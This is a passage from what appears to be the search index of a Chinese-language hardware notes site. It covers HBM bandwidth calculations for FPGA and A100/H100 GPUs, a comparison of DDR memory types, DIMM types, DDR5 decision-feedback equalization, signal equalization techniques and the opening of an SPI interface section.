128 \\mathrm{(bits/transfer)} * 8 \\mathrm{(Channels)} = 3276.8 \\mathrm{(Gb/s)} = 409.6 \\mathrm{(GB/s)} \\] <p>\u200b\u6240\u4ee5\u200b\u4e00\u7247\u200b HBM \u200b\u7684\u200b\u4f20\u8f93\u901f\u7387\u200b\u5c31\u200b\u76f8\u5f53\u4e8e\u200b 16 \u200b\u4e2a\u200b\u4f20\u7edf\u200b\u7684\u200b DDR SDRAM\uff0c\u200b\u9760\u200b\u7684\u200b\u662f\u200b 8 \u200b\u4e2a\u200b Channel \u200b\u4ee5\u53ca\u200b\u53cc\u500d\u200b\u7684\u200b\u4f4d\u200b\u5bbd\u200b\u3002\u200b\u6bcf\u4e2a\u200b Channel \u200b\u7684\u200b\u4f4d\u200b\u5bbd\u200b\u662f\u200b 128 \u200b\u4f4d\u200b\uff0c\u200b\u5b9e\u9645\u4e0a\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u628a\u200b\u4e24\u7247\u200b 64-bit SDRAM \u200b\u5e76\u200b\u8d77\u6765\u200b\u4e86\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5f53\u6210\u200b\u4e00\u4e2a\u200b 128 \u200b\u4f4d\u200b\u7684\u200b\u7528\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b Pseudo Channel \u200b\u6a21\u5f0f\u200b\u4e0b\u200b\uff0c\u200b\u5f53\u6210\u200b\u5171\u4eab\u200b\u5730\u5740\u200b\u548c\u200b\u547d\u4ee4\u200b\u4fe1\u53f7\u200b\u7684\u200b\u4e24\u4e2a\u200b SDRAM \u200b\u7528\u200b\u3002</p> <p>\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0cHBM \u200b\u7684\u200b\u9ad8\u5e26\u5bbd\u200b\u7684\u200b\u4ee3\u4ef7\u200b\u5c31\u662f\u200b\u5f15\u811a\u200b\u6570\u91cf\u200b\u5f88\u591a\u200b\u3002\u200b\u6839\u636e\u200b HBM3 JESD238A \u200b\u6807\u51c6\u200b\uff0c\u200b\u6bcf\u4e2a\u200b Channel \u200b\u8981\u200b 120 \u200b\u4e2a\u200b pin\uff0c\u200b\u4e00\u5171\u200b 16 \u200b\u4e2a\u200b channel\uff08HBM2 \u200b\u662f\u200b 8 channel\uff0c\u200b\u6bcf\u4e2a\u200b channel 128 \u200b\u4f4d\u200b\uff1bHBM3 \u200b\u662f\u200b 16 channel\uff0c\u200b\u6bcf\u4e2a\u200b channel 64 \u200b\u4f4d\u200b\uff09\uff0c\u200b\u52a0\u4e0a\u200b\u5176\u4f59\u200b\u7684\u200b 52 \u200b\u4e2a\u200b pin\uff0c\u200b\u8fd9\u4e9b\u200b\u52a0\u200b\u8d77\u6765\u200b\u5c31\u200b 1972 \u200b\u4e2a\u200b pin \u200b\u4e86\u200b\u3002\u200b\u6240\u4ee5\u200b\u4e00\u822c\u200b\u5728\u200b Silicon Interposer \u200b\u4e0a\u200b\u4e0e\u200b\u5904\u7406\u5668\u200b\u8fde\u63a5\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u4f20\u7edf\u200b\u7684\u200b\u5728\u200b PCB \u200b\u4e0a\u200b\u8d70\u7ebf\u200b\uff1a</p> <p> </p> HBM \u200b\u7684\u200b\u5c01\u88c5\u200b\u5f62\u5f0f\u200b\uff08\u200b\u56fe\u6e90\u200b A 1.2V 20nm 307GB/s HBM DRAM with At-Speed Wafer-Level I/O Test Scheme and Adaptive Refresh Considering Temperature Distribution\uff09 <p>\u200b\u6240\u4ee5\u200b\u5728\u200b HBM3 \u200b\u6807\u51c6\u200b\u91cc\u200b\uff0c\u200b\u7528\u200b Microbump \u200b\u6765\u200b\u63cf\u8ff0\u200b HBM \u200b\u7684\u200b pin\u3002\u200b\u53ef\u4ee5\u200b\u5f62\u8c61\u200b\u5730\u200b\u7406\u89e3\u200b\u4e3a\u200b\uff0c\u200b\u628a\u200b\u539f\u6765\u200b\u63d2\u200b\u5728\u200b\u4e3b\u677f\u200b\u4e0a\u200b\u7684\u200b\u5185\u5b58\u6761\u200b\u62c6\u5f00\u200b\uff0c\u200b\u53ea\u200b\u4fdd\u7559\u200b\u82af\u7247\u200b\uff0c\u200b\u628a\u200b\u82af\u7247\u200b\u7ad6\u76f4\u200b\u5806\u53e0\u200b\u8d77\u6765\u200b\uff0c\u200b\u53d8\u6210\u200b\u4e00\u4e2a\u200b HBM Die\uff0c\u200b\u7136\u540e\u200b\u7d27\u5bc6\u200b\u5730\u200b\u8fde\u63a5\u200b\u5230\u200b CPU \u200b\u4e2d\u200b\u3002\u200b\u4f46\u662f\u200b\u53e6\u4e00\u65b9\u9762\u200b\uff0c\u200b\u5bc6\u5ea6\u200b\u4e0a\u53bb\u200b\u4e86\u200b\uff0c\u200b\u4ef7\u683c\u200b\u4e5f\u200b\u66f4\u200b\u8d35\u200b\u4e86\u200b\u3002\u200b\u540c\u65f6\u200b\u6269\u5c55\u6027\u200b\u4e5f\u200b\u4e0b\u964d\u200b\u4e86\u200b\uff0c\u200b\u4e0d\u80fd\u200b\u50cf\u200b DDR SDRAM \u200b\u90a3\u6837\u200b\u5728\u200b\u4e3b\u677f\u200b\u4e0a\u200b\u63d2\u200b\u5f88\u591a\u200b\u6761\u200b\u3002</p> <p>\u200b\u4e0b\u9762\u200b\u6765\u200b\u5206\u6790\u200b\u4e00\u4e9b\u200b\u5178\u578b\u200b\u7684\u200b\u5e26\u6709\u200b HBM \u200b\u7684\u200b\u7cfb\u7edf\u200b\u7684\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\uff1a</p> <p>Xilinx \u200b\u7684\u200b Virtex Ultrascale Plus HBM FPGA \u200b\u63d0\u4f9b\u200b\u4e86\u200b \\(1800 \\mathrm{(MT/s)} * 128 \\mathrm{(bits/transfer)} * 8 \\mathrm{(Channels)} = 230.4 \\mathrm{(GB/s)}\\) \u200b\u7684\u200b\u5e26\u5bbd\u200b\uff0c\u200b\u5982\u679c\u200b\u7528\u200b\u4e86\u200b\u4e24\u7247\u200b HBM \u200b\u5c31\u662f\u200b 460.8 GB/s\u3002\u200b\u66b4\u9732\u200b\u7ed9\u200b FPGA \u200b\u903b\u8f91\u200b\u7684\u200b\u662f\u200b 16 \u200b\u4e2a\u200b 256 \u200b\u4f4d\u200b\u7684\u200b AXI3 \u200b\u7aef\u53e3\u200b\uff0cAXI \u200b\u9891\u7387\u200b 450 MHz\uff0c\u200b\u5185\u5b58\u200b\u9891\u7387\u200b 900 MHz\u3002\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u6bcf\u4e2a\u200b AXI3 \u200b\u5c31\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u4e00\u4e2a\u200b HBM \u200b\u7684\u200b pseudo channel\u3002\u200b\u6bcf\u4e2a\u200b pseudo channel \u200b\u662f\u200b 64 \u200b\u4f4d\u200b\uff0c\u200b\u4f46\u662f\u200b AXI \u200b\u7aef\u53e3\u200b\u662f\u200b 256 \u200b\u4f4d\u200b\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u5728\u200b\u901f\u7387\u200b\u4e0d\u53d8\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u4ece\u200b 450MHz \u200b\u5230\u200b 900MHz\uff0c\u200b\u518d\u200b\u52a0\u4e0a\u200b DDR\uff0c\u200b\u7b49\u4ef7\u200b\u4e8e\u200b\u9891\u7387\u200b\u7ffb\u200b\u4e86\u200b\u56db\u500d\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4f4d\u200b\u5bbd\u200b\u4e5f\u200b\u8981\u200b\u76f8\u5e94\u200b\u5730\u200b\u4ece\u200b 64 \u200b\u4f4d\u7ffb\u200b\u56db\u500d\u200b\u5230\u200b 256 \u200b\u4f4d\u200b\u3002</p> <p>A100 \u200b\u663e\u5361\u200b 40GB PCIe \u200b\u7248\u672c\u200b\u91c7\u7528\u200b\u4e86\u200b 5 \u200b\u4e2a\u200b 8 GB \u200b\u7684\u200b HBM \u200b\u5185\u5b58\u200b\uff0c\u200b\u8fd0\u884c\u200b\u5728\u200b 1215 MHz \u200b\u7684\u200b\u9891\u7387\u200b\u4e0b\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\u5c31\u662f\u200b \\(1215 \\mathrm{(MHz)} * 2 \\mathrm{(DDR)} * 8 \\mathrm{(channels)} * 128 \\mathrm{(bits/transfer)} / 8 \\mathrm{(bits/byte)} * 5 \\mathrm{(HBM)} = 1555 \\mathrm{(GB/s)}\\)\uff0c\u200b\u4e0e\u200b Datasheet \u200b\u543b\u5408\u200b\u3002A100 Datasheet \u200b\u4e2d\u200b\u7684\u200b Memory bus width \u200b\u7684\u200b\u8ba1\u7b97\u200b\u65b9\u5f0f\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b\u628a\u200b\u6240\u6709\u200b\u7684\u200b Channel \u200b\u4f4d\u5bbd\u52a0\u200b\u8d77\u6765\u200b\uff1a\\(128 \\mathrm{(bits/transfer)} * 8 \\mathrm{(channels)} * 5 \\mathrm{(stacks)} = 5120 \\mathrm{(bits)}\\)\u3002</p> <p>A100 \u200b\u663e\u5361\u200b 80GB PCIe \u200b\u7248\u672c\u200b\u628a\u200b HBM2 \u200b\u5347\u7ea7\u200b\u5230\u200b\u4e86\u200b HBM2e\uff0c\u200b\u540c\u65f6\u200b\u5185\u5b58\u200b\u65f6\u949f\u200b\u9891\u7387\u200b\u4e5f\u200b\u5347\u7ea7\u200b\u5230\u200b\u4e86\u200b 1512 MHz\uff0c\u200b\u6b64\u65f6\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\u5c31\u662f\u200b \\(1512 \\mathrm{(MHz)} * 2 \\mathrm{(DDR)} * 8 \\mathrm{(channels)} * 128 \\mathrm{(bits/transfer)} / 8 \\mathrm{(bits/byte)} * 5 \\mathrm{(HBM)} = 1935 \\mathrm{(GB/s)}\\)\uff0c\u200b\u4e0e\u200b Datasheet \u200b\u543b\u5408\u200b\u3002</p> <p>H100 \u200b\u663e\u5361\u200b 80GB SXM5 \u200b\u7248\u672c\u200b\u628a\u200b HBM \u200b\u5347\u7ea7\u200b\u5230\u200b\u4e86\u200b HBM3\uff0c\u200b\u5185\u5b58\u5bb9\u91cf\u200b\u4f9d\u7136\u200b\u662f\u200b 80GB\uff0c\u200b\u4f46\u662f\u200b\u65f6\u949f\u200b\u9891\u7387\u200b\u63d0\u9ad8\u200b\u5230\u200b\u4e86\u200b 2619 MHz\uff0c\u200b\u6b64\u65f6\u200b\uff0c\u200b\u5185\u5b58\u200b\u5e26\u5bbd\u200b\u662f\u200b \\(2619 \\mathrm{(MHz)} * 2 \\mathrm{(DDR)} * 8 \\mathrm{(channels)} * 128 \\mathrm{(bits/transfer)} / 8 \\mathrm{(bits/byte)} * 5 \\mathrm{(HBM)} = 3352 \\mathrm{(GB/s)}\\)\u3002</p>"},{"location":"hardware/sdram.html#dram-cell","title":"DRAM Cell","text":"<p>DRAM \u200b\u7684\u200b\u6570\u636e\u200b\u5b58\u50a8\u200b\u5728\u200b\u7535\u5bb9\u200b\u4e2d\u200b\u3002\u200b\u5178\u578b\u200b\u7684\u200b 1T DRAM Cell \u200b\u5185\u90e8\u200b\u6784\u9020\u200b\u5982\u4e0b\u200b\uff1a</p> <p> </p> 1T DRAM Cell \u200b\u5185\u90e8\u200b\u6784\u9020\u200b\uff08\u200b\u56fe\u6e90\u200b Berkeley EECS 151/251A Spring 2019\uff09"},{"location":"hardware/sdram.html#ddr","title":"\u51e0\u79cd\u200b DDR \u200b\u7684\u200b\u5bf9\u6bd4","text":"<p>\u200b\u4e0b\u9762\u200b\u7ed9\u51fa\u200b DDR\uff0cLPDDR\uff0cGDDR \u200b\u548c\u200b HBM \u200b\u7684\u200b\u5bf9\u6bd4\u200b\uff1a</p> DDR4 DDR5 LPDDR4 LPDDR5 GDDR5 GDDR6 HBM2 Channel \u200b\u6570\u91cf\u200b 1 2 2 2 2 2 8 \u200b\u6bcf\u200b Channel \u200b\u4f4d\u200b\u5bbd\u200b 64 32 16 16/32 16 16 128 \u200b\u6570\u636e\u200b\u901f\u7387\u200b\uff08MT/s\uff09 3200 5600 4266 6400 9000 24000 2400 \u200b\u603b\u200b\u5e26\u5bbd\u200b\uff08GB/s\uff09 25.6 GB/s 44.8 GB/s 17.1 GB/s 25.6 GB/s 36 GB/s 96 GB/s 307 GB/s <p>\u200b\u6570\u636e\u200b\u901f\u7387\u200b\u6309\u7167\u200b\u80fd\u67e5\u200b\u5230\u200b\u7684\u200b\u578b\u53f7\u200b\u7684\u200b\u6700\u9ad8\u200b\u6027\u80fd\u200b\uff1a</p> <ul> <li>DDR4: Micron 3200 MT/s</li> <li>DDR5: Micron 5600 MT/s</li> <li>LPDDR4: Samsung 4266 MT/s</li> <li>LPDDR5: Samsung 6400 MT/s</li> <li>GDDR5: Samsung 9000 MT/s</li> <li>GDDR6: Samsung 24000 MT/s</li> <li>HBM2: Samsung 2400 MT/s</li> <li>HBM2E: Micron 3200 MT/s</li> </ul>"},{"location":"hardware/sdram.html#udimmrdimmlrdimm","title":"UDIMM/RDIMM/LRDIMM","text":"<p>\u200b\u5177\u4f53\u200b\u5230\u200b DIMM\uff0c\u200b\u53c8\u200b\u6709\u200b\u4e0d\u540c\u200b\u7684\u200b\u7c7b\u578b\u200b\uff1a</p> <ul> <li>UDIMM(Unbuffered DIMM): \u200b\u6ca1\u6709\u200b\u989d\u5916\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u6253\u200b\u62cd\u200b</li> <li>RDIMM(Registered DIMM): \u200b\u5bf9\u200b\u5730\u5740\u200b\u3001\u200b\u547d\u4ee4\u200b\u548c\u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\u52a0\u200b\u5bc4\u5b58\u5668\u200b\u6253\u200b\u62cd\u200b\uff0c\u200b\u6570\u636e\u4fe1\u53f7\u200b\u4e0d\u200b\u52a0\u200b\u5bc4\u5b58\u5668\u200b</li> <li>LRDIMM(Load Reduced DIMM): \u200b\u5728\u200b RDIMM \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u7ed9\u200b\u6570\u636e\u4fe1\u53f7\u200b\u4e5f\u200b\u52a0\u4e0a\u200b\u5bc4\u5b58\u5668\u200b</li> </ul> <p>\u200b\u968f\u7740\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u589e\u52a0\u200b\uff0c\u200b\u5ef6\u8fdf\u200b\u589e\u52a0\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e5f\u200b\u80fd\u200b\u8fbe\u5230\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u9891\u7387\u200b\uff0c\u200b\u66f4\u5927\u200b\u7684\u200b\u5bb9\u91cf\u200b\u3002</p>"},{"location":"hardware/sdram.html#ddr5-dfe","title":"DDR5 DFE","text":"<p>DDR5 \u200b\u5f15\u5165\u200b\u4e86\u200b DFE \u200b\u6765\u200b\u6539\u8fdb\u200b\u4fe1\u53f7\u200b\u5b8c\u6574\u6027\u200b\u3002\u200b\u5173\u4e8e\u200b DFE\uff0c\u200b\u8be6\u89c1\u200b \u200b\u4fe1\u53f7\u5904\u7406\u200b \u200b\u4e2d\u200b\u7684\u200b\u4ecb\u7ecd\u200b\u3002</p> <p>DDR5 \u200b\u652f\u6301\u200b 4-Tap DFE\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u8003\u8651\u200b\u7684\u200b\u662f\u200b\u6700\u8fd1\u200b\u56db\u4e2a\u200b\u7b26\u53f7\u200b\u5bf9\u200b\u5f53\u524d\u200b\u7b26\u53f7\u200b\u5e26\u6765\u200b\u7684\u200b\u5e72\u6270\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u56db\u4e2a\u200b\u7cfb\u6570\u200b\u3002\u200b\u4e3a\u4e86\u200b\u6d4b\u91cf\u200b\u51fa\u200b\u8fd9\u200b\u56db\u4e2a\u200b\u7cfb\u6570\u200b\uff0c\u200b\u5728\u200b\u8bad\u7ec3\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9996\u5148\u200b\u53d1\u51fa\u200b\u4e00\u4e2a\u200b\u8109\u51b2\u200b\uff0c\u200b\u7136\u540e\u200b\u89c2\u5bdf\u200b\u5b83\u200b\u7684\u200b\u54cd\u5e94\u200b\uff0c\u200b\u901a\u8fc7\u200b\u4e0d\u65ad\u200b\u8c03\u6574\u200b\u7cfb\u6570\u200b\uff0c\u200b\u62b5\u6d88\u200b\u5b83\u200b\u5bf9\u200b\u540e\u7eed\u200b\u7b26\u53f7\u200b\u7684\u200b\u5e72\u6270\u200b\u3002</p> <p> </p> DDR5 DFE\uff08\u200b\u56fe\u6e90\u200b Meeting the 5 Key DDR5 Test Challenges as We Migrate to Next Gen Memory\uff09 <p> </p> DDR5 DFE\uff08\u200b\u56fe\u6e90\u200b Meeting the 5 Key DDR5 Test Challenges as We Migrate to Next Gen Memory\uff09"},{"location":"hardware/sdram.html#_11","title":"\u76f8\u5173\u200b\u9605\u8bfb","text":"<ul> <li>DDR4 Bank Groups in Embedded Applications</li> <li>DDR4 Tutorial - Understanding the Basics</li> <li>DDR5/4/3/2: How Memory Density and Speed Increased with each Generation of DDR</li> <li>DDR5 vs DDR4 DRAM \u2013 All the Advantages &amp; Design Challenges</li> <li>Understanding DDR3 Write Leveling and Read Leveling</li> <li>Will HBM replace DDR and become Computer Memory?</li> </ul>"},{"location":"hardware/signal_processing.html","title":"\u4fe1\u53f7\u5904\u7406","text":""},{"location":"hardware/signal_processing.html#pre-emphasis","title":"\u9884\u200b\u52a0\u91cd\u200b Pre-Emphasis","text":"<p>\u200b\u4fe1\u53f7\u200b\u5728\u200b\u4ecb\u8d28\u200b\u4e2d\u200b\u4f20\u64ad\u200b\u65f6\u200b\uff0c\u200b\u4e0d\u540c\u200b\u9891\u7387\u200b\u7684\u200b\u5206\u91cf\u200b\u7684\u200b\u8870\u51cf\u200b\u6bd4\u4f8b\u200b\u4e0d\u540c\u200b\uff0c\u200b\u4f8b\u5982\u200b\u9ad8\u9891\u200b\u5206\u91cf\u200b\u8870\u51cf\u200b\u8f83\u200b\u591a\u200b\uff0c\u200b\u4f4e\u9891\u200b\u5206\u91cf\u200b\u8870\u51cf\u200b\u8f83\u200b\u5c11\u200b\u3002\u200b\u4e3a\u4e86\u200b\u4fe1\u53f7\u200b\u7684\u200b\u6b63\u5e38\u200b\u4f20\u8f93\u200b\uff0c\u200b\u63a5\u8fd1\u200b\u9ad8\u9891\u200b\u5206\u91cf\u200b\u8870\u51cf\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u5728\u200b\u53d1\u9001\u200b\u7aef\u200b\u6dfb\u52a0\u200b\u4e00\u4e9b\u200b\u989d\u5916\u200b\u7684\u200b\u9ad8\u9891\u200b\u5206\u91cf\u200b\u3002</p>"},{"location":"hardware/signal_processing.html#equalization","title":"\u5747\u8861\u200b Equalization","text":"<p>\u200b\u5747\u8861\u200b\u7684\u200b\u610f\u601d\u200b\u662f\u200b\uff0c\u200b\u8ba9\u200b\u4ecb\u8d28\u200b\u5bf9\u200b\u4e0d\u540c\u200b\u9891\u7387\u200b\u5206\u91cf\u200b\u7684\u200b\u8870\u51cf\u200b\u5747\u8861\u200b\u3002</p>"},{"location":"hardware/signal_processing.html#ctle-continuous-time-linear-equalization","title":"CTLE Continuous-Time Linear Equalization","text":"<p>\u200b\u5728\u200b\u9891\u57df\u200b\u6a21\u62df\u4fe1\u53f7\u200b\u4e0a\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u9ad8\u901a\u200b\u6ee4\u6ce2\u5668\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7531\u200b RLC \u200b\u7535\u8def\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u7ebf\u6027\u200b\u3002</p> <p> </p> CTLE\uff08\u200b\u56fe\u6e90\u200b https://people.engr.tamu.edu/spalermo/ecen689/lecture18_ee689_rx_fir_ctle_eq.pdf\uff09"},{"location":"hardware/signal_processing.html#ffe-feed-forward-equalization","title":"FFE Feed-Forward Equalization","text":"<p>\u200b\u5728\u200b\u65f6\u57df\u200b\u6570\u5b57\u4fe1\u53f7\u200b\u4e0a\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u7b49\u4ef7\u200b\u4e8e\u200b\u4e00\u4e2a\u200b Finite Impulse Response (FIR)\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u628a\u200b\u4e00\u4e2a\u200b\u65b9\u6ce2\u200b\u5206\u89e3\u6210\u200b\u51e0\u4e2a\u200b\u5c0f\u200b\u7684\u200b\u65b9\u6ce2\u200b\uff0c\u200b\u7ebf\u6027\u200b\u3002</p> <p> </p> FFE\uff08\u200b\u56fe\u6e90\u200b https://people.engr.tamu.edu/spalermo/ecen689/lecture18_ee689_rx_fir_ctle_eq.pdf\uff09"},{"location":"hardware/signal_processing.html#dfe-decision-feedback-equalization","title":"DFE Decision-Feedback Equalization","text":"<p>\u200b\u5728\u200b\u65f6\u57df\u200b\u6570\u5b57\u4fe1\u53f7\u200b\u4e0a\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u4ece\u200b\u4fe1\u53f7\u200b\u89e3\u6790\u200b\u51fa\u662f\u200b\u5f53\u524d\u200b\u4f20\u8f93\u200b\u7684\u200b\u662f\u200b\u4ec0\u4e48\u200b\u7b26\u53f7\u200b\u540e\u200b\uff0c\u200b\u6839\u636e\u200b\u8be5\u200b\u7b26\u53f7\u200b\u751f\u6210\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u6765\u200b\u62b5\u6d88\u200b\u8be5\u200b\u7b26\u53f7\u200b\u5bf9\u200b\u540e\u7eed\u200b\u7b26\u53f7\u200b\u7684\u200b\u5e72\u6270\u200b\uff0c\u200b\u975e\u7ebf\u6027\u200b\uff08\u200b\u56e0\u4e3a\u200b\u4ece\u200b\u4fe1\u53f7\u200b\u5224\u65ad\u200b\u7b26\u53f7\u200b\u662f\u200b\u975e\u7ebf\u6027\u200b\u7684\u200b\uff09\u3002</p> <p>\u200b\u5047\u5982\u200b\u5148\u200b\u4f20\u8f93\u200b\u7b26\u53f7\u200b A\uff0c\u200b\u518d\u200b\u4f20\u8f93\u200b\u7b26\u53f7\u200b B\uff0c\u200b\u90a3\u4e48\u200b A \u200b\u4f1a\u200b\u7ed9\u200b B \u200b\u5e26\u6765\u200b\u5e72\u6270\u200b\u3002\u200b\u5728\u200b\u63a5\u6536\u200b\u5230\u200b B \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5df2\u7ecf\u200b\u77e5\u9053\u200b A \u200b\u662f\u200b\u4ec0\u4e48\u200b\u4e86\u200b\u3002\u200b\u4e3a\u4e86\u200b\u80fd\u591f\u200b\u6b63\u786e\u200b\u5730\u200b\u63a5\u6536\u200b B\uff0c\u200b\u9996\u5148\u200b\u8ba1\u7b97\u200b\u51fa\u200b A \u200b\u5bf9\u200b B \u200b\u7684\u200b\u5e72\u6270\u200b\uff0c\u200b\u53bb\u6389\u200b\u8fd9\u4e2a\u200b\u5e72\u6270\u200b\uff0c\u200b\u518d\u200b\u5224\u65ad\u200b B \u200b\u662f\u200b\u4ec0\u4e48\u200b\u3002\u200b\u66f4\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u7b26\u53f7\u200b\u53ef\u80fd\u200b\u5bf9\u200b\u540e\u7eed\u200b\u7684\u200b\u591a\u4e2a\u200b\u7b26\u53f7\u200b\u5e26\u6765\u200b\u5e72\u6270\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u7528\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u65b9\u6cd5\u200b\u6765\u200b\u53bb\u6389\u200b\u524d\u200b\u82e5\u5e72\u4e2a\u200b\u7b26\u53f7\u200b\u5bf9\u200b\u5f53\u524d\u200b\u7b26\u53f7\u200b\u7684\u200b\u5e72\u6270\u200b\u3002</p> <p> </p> DFE\uff08\u200b\u56fe\u6e90\u200b https://docs.keysight.com/eesofapps/post-8-eye-opening-experience-with-dfe-678068404.html\uff09 <p> </p> DFE\uff08\u200b\u56fe\u6e90\u200b http://www.seas.ucla.edu/brweb/papers/Journals/BRFall17DFE.pdf\uff09"},{"location":"hardware/signal_processing.html#_2","title":"\u53c2\u8003","text":"<ul> <li>\u200b\u9884\u200b\u52a0\u91cd\u200b\u3001\u200b\u53bb\u200b\u52a0\u91cd\u200b\u548c\u200b\u5747\u8861\u200b</li> <li>Emphasis (telecommunications)</li> <li>Transmitter Pre-Emphasis and Receiver Equalization</li> <li>Post 6: Eye-opening Experience with CTLE</li> <li>Post 7: Eye-opening Experience with FFE</li> <li>Post 8: Eye-opening Experience with DFE</li> <li>RX FIR &amp; CTLE Equalization</li> <li>ECEN 689 High-Speed Links Circuits and Systems Lab5 Equalization Circuits</li> <li>The Decision-Feedback Equalizer</li> </ul>"},{"location":"hardware/spi.html","title":"SPI (Serial Peripheral Interface)","text":""},{"location":"hardware/spi.html#_1","title":"\u63a5\u53e3","text":"<p>SPI \u200b\u534f\u8bae\u200b\u6d89\u53ca\u200b\u5230\u200b\u56db\u4e2a\u200b\u4fe1\u53f7\u200b\uff1a</p> <ul> <li>SCLK: \u200b\u65f6\u949f\u200b\u4fe1\u53f7\u200b\uff0cMaster -&gt; Slave</li> <li>MOSI\uff1a\u200b\u6570\u636e\u4fe1\u53f7\u200b\uff0cMaster -&gt; Slave</li> <li>MISO\uff1a\u200b\u6570\u636e\u4fe1\u53f7\u200b\uff0cSlave -&gt; Master</li> <li>CS\uff1a\u200b\u82af\u7247\u200b\u4f7f\u80fd\u200b\uff0c\u200b\u4e00\u822c\u200b\u662f\u200b\u4f4e\u200b\u6709\u6548\u200b</li> </ul> <p>\u200b\u8981\u200b\u901a\u8fc7\u200b SPI \u200b\u534f\u8bae\u200b\u53d1\u9001\u200b\u547d\u4ee4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u901a\u5e38\u200b\u9700\u8981\u200b\u5148\u62c9\u4f4e\u200b CS\uff0c\u200b\u7136\u540e\u200b\u542f\u52a8\u200b SCLK \u200b\u65f6\u949f\u200b\uff0c\u200b\u540c\u65f6\u200b\u6536\u53d1\u200b\u6570\u636e\u200b\u3002\u200b\u6ce8\u610f\u200b SPI \u200b\u662f\u200b\u5168\u53cc\u5de5\u200b\u7684\u200b\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u53d1\u9001\u200b\u7684\u200b\u540c\u65f6\u200b\u4e5f\u200b\u5728\u200b\u63a5\u6536\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u901a\u5e38\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5916\u8bbe\u200b\u7b49\u5230\u200b\u4e3b\u673a\u200b\u53d1\u9001\u200b\u4e86\u200b\u547d\u4ee4\u200b\u672c\u8eab\u200b\uff0c\u200b\u624d\u200b\u77e5\u9053\u200b\u8981\u200b\u56de\u590d\u200b\u4ec0\u4e48\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u547d\u4ee4\u200b\u8bbe\u8ba1\u200b\u6210\u200b\u4e86\u200b\u4e8b\u5b9e\u4e0a\u200b\u7684\u200b\u534a\u53cc\u5de5\u200b\uff1a\u200b\u524d\u534a\u90e8\u200b\u5206\u200b\u4e3b\u673a\u200b\u5728\u200b\u53d1\u200b\u547d\u4ee4\u200b\uff0c\u200b\u5916\u8bbe\u200b\u53d1\u9001\u200b\u65e0\u7528\u200b\u7684\u200b\u6570\u636e\u200b\uff1b\u200b\u540e\u534a\u90e8\u200b\u5206\u5916\u200b\u8bbe\u5728\u200b\u53d1\u9001\u200b\u54cd\u5e94\u200b\uff0c\u200b\u4e3b\u673a\u200b\u53d1\u9001\u200b\u65e0\u7528\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p>"},{"location":"hardware/spi.html#_2","title":"\u6ce2\u5f62","text":"<p>SPI \u200b\u6709\u200b\u4e0d\u540c\u200b\u7684\u200b\u7c7b\u578b\u200b\uff0c\u200b\u4e0b\u9762\u200b\u8bb2\u200b\u4e00\u79cd\u200b\u6bd4\u8f83\u200b\u5e38\u89c1\u200b\u7684\u200b\u914d\u7f6e\u200b\uff08\u200b\u5373\u200b CPOL=0\uff0cCPHA=0\uff09\uff0c\u200b\u5728\u200b\u8fd9\u79cd\u200b\u6a21\u5f0f\u200b\u4e0b\u200b\uff0cMaster \u200b\u548c\u200b Slave \u200b\u90fd\u200b\u662f\u200b\u5728\u200b\u65f6\u949f\u200b\u7684\u200b\u4e0b\u964d\u200b\u6cbf\u200b\u4fee\u6539\u200b\u8f93\u51fa\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u7136\u540e\u200b\u5728\u200b\u65f6\u949f\u200b\uff08<code>sclk</code>\uff09\u200b\u7684\u200b\u4e0a\u5347\u200b\u6cbf\u5bf9\u200b\u63a5\u6536\u200b\u5230\u200b\u7684\u200b\u6570\u636e\u200b\u8fdb\u884c\u200b\u91c7\u6837\u200b\uff1a</p> 